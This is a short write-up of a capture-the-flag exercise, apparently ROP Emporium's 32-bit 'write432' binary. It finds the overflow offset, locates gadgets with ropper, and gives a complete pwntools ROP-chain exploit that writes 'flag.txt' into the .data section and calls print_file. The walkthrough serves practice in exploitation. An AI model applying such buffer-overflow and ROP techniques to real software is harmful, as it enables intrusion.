# Contents
* Task Description
* 32 bit
* 32 bit script

## Task Description
Our first foray into proper gadget use.  
A useful function is still present, but we'll need to write a string into memory somehow.

## 32 bit
File checks. No PIE or stack canary.

gdb to find the eip offset. -> 44
Two functions:
* UsefulFunction -> print_file call (0x80483d0)
* UsefulGadget -> loads the ebp into the memory location of the edi (0x08048543)
Get .data section -> readelf -S write432 (0x0804a018)
Now we just need a way of getting data into the edi and ebp

```bash
ropper -f write432 --search pop
0x080485aa: pop edi; pop ebp; ret; 
```

So the payload will be
```txt

buffer
ropper_gadget
data_location
"flag"
usefulgadget

ropper_gadget
data_location+4
".txt"
usefulgadget

usefulfunction
ret_pointer(0x0)
data_location
```

We need a ret pointer as usefulfunction is a call.

Instead of manual exploitation going to use pwntools.

## Script
```python
from pwn import *

data_section = 0x0804a018
pop = 0x080485aa
mov = 0x08048543
print_file = 0x80483d0
  
payload = flat(
	asm('nop') *44,
	
	pop,
	data_section,
	'flag',
	mov,
	
	pop,
	data_section+0x4,
	'.txt',
	mov,
	  
	print_file,
	0x0,
	data_section
)

io=process(['./write432'])
io.sendlineafter('>',payload)
io.recvuntil('Thank you!\n')
flag= io.recv()

success(flag)
```
This works and gives the flag :)

---
Creation date: 13-10-2022

Last modified date: Saturday 12th November 2022
***
